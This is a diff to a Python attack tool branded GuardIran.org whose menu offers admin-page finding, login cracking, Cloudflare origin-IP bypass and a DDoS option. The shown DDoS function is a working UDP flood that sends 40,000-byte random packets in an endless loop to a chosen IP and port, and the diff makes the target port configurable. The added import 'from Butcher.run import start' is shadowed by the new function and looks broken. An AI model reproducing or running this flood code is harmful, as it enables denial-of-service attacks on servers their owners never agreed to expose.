@@ -3,6 +3,7 @@
 #################################################
 
 
+from Butcher.run import start
 from colorama import Fore,init
 from pyfiglet import figlet_format as font
 import os,sys,time,socket,requests,random
@@ -112,6 +113,7 @@ def bypass():
                         send=socket.gethostbyname(thehost)
                     except KeyboardInterrupt:
                         input(' [~] press Enter to Exit...')
+                        start()
                     except:
                         pass
                     if host_name !=send:
@@ -138,43 +140,45 @@ def bypass():
 def DDOS():
     os.system('cls'or'clear')
     print(font('GuardIran.org'))
-    get=input(' [+] please Enter IP address : ')
-    ip=socket.gethostbyname(str(get))
+    ip=input(' [+] please Enter IP address : ')
+    port=input(' [+] on port : ')
     sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)#.sendto(byte())
     try:
         while True:    
-            send=sock.sendto(random._urandom(40000),(ip,80))
-            print(f' [+] send packet to {ip}:80')
+            send=sock.sendto(random._urandom(40000),(ip,port))
+            print(f' [+] send packet to {ip}:{port}')
     except KeyboardInterrupt:
        input(' [+] press enter to exit...')
 ################################################
 #the inputs
 ################################################
-while True:
-    try:
-        os.system('cls'or'clear')
-        print(font('GuardIran.org'))
-        print('\n   ___    creator=>https://guardiran.org/profiles/31337-sparta/    ___')
-        time.sleep(4)
-        num1=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'1'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' admin finder '
-        num2=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'2'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' crack login page '
-        num3=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'3'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' get orginal IP address and bypass cloud flare '
-        num4=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'4'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' DDOS Attack '
-        num5=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'99'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' Exit '
+def start():
+    while True:
+        try:
+            os.system('cls'or'clear')
+            print(font('GuardIran.org'))
+            print('\n   ___    creator=>https://guardiran.org/profiles/31337-sparta/    ___')
+            time.sleep(4)
+            num1=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'1'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' admin finder '
+            num2=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'2'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' crack login page '
+            num3=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'3'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' get orginal IP address and bypass cloud flare '
+            num4=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'4'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' DDOS Attack '
+            num5=Fore.LIGHTYELLOW_EX+' ['+Fore.WHITE+'99'+Fore.LIGHTYELLOW_EX+'] '+':'+Fore.LIGHTGREEN_EX+' Exit '
 
-        print(f'\n{num1}\n{num2}\n{num3}\n{num4}\n{num5}')
-        get=input(' sparta@guardiran:~# ')
-        if '1' in get:
-            _Run_()
-        elif '2' in get:
-            login()
-        elif '3'in get:
-            bypass()
-        elif '4'in get:
-            DDOS()
-        elif get=='99':
+            print(f'\n{num1}\n{num2}\n{num3}\n{num4}\n{num5}')
+            get=input(' sparta@guardiran:~# ')
+            if '1' in get:
+                _Run_()
+            elif '2' in get:
+                login()
+            elif '3'in get:
+                bypass()
+            elif '4'in get:
+                DDOS()
+            elif get=='99':
+                sys.exit()
+        except KeyboardInterrupt:
+            input('\n [+] press Enter to exit...')
             sys.exit()
-    except KeyboardInterrupt:
-        input('\n [+] press Enter to exit...')
-        sys.exit()
-    
+start()
+ 
